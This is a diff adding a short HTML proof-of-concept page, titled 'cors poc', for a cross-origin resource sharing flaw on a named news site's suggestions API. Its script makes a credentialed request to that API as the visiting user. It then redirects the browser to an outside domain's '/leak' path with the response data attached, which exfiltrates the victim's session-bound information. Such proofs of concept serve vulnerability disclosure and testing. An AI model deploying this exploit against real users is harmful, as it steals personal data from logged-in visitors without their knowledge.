@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<body>
+  <h2>cors poc</h2>
+
+  <script>
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','https://hey.bild.de/api/suggestions',true);
+    req.withCredentials = true;
+    req.send();
+
+    function reqListener() {
+    	location='//hey.bild.de.mzero.cloud/leak"?key='+this.responseText;
+    };
+
+  </script>
+</body>
+</html>
